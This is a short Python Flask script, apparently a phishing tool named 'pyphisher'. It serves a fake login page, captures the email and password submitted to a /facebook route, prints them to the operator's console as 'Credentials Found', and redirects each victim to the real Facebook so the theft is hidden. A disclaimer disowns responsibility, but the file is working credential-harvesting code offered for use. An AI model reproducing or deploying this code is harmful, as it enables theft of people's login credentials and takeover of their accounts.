from flask import *
from termcolor import colored
from prettytable import PrettyTable

app = Flask(__name__)

print("""         

                       __    _      __             
    ____  __  ______  / /_  (_)____/ /_  ___  _____
   / __ \/ / / / __ \/ __ \/ / ___/ __ \/ _ \/ ___/
  / /_/ / /_/ / /_/ / / / / (__  ) / / /  __/ /    
 / .___/\__, / .___/_/ /_/_/____/_/ /_/\___/_/     
/_/    /____/_/                                    

 

Disclaimer: I'm Not Responsible For Your Action

""")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/facebook',methods = ['POST'])  
def facebook():  
      uname=request.form['email']  
      passwrd=request.form['password']
      x = PrettyTable()
      x.field_names = ["Email","password"]
      print(x.add_row([uname,passwrd]))
      print('''Credentials Found:    ''')
      print(colored(x, 'cyan'))
      print(''' Waiting For Other Victim ''')
 
 
      return redirect("http://www.facebook.com")
      

if __name__ == "__main__":

     app.run(debug=True,host='0.0.0.0',port=5000)
     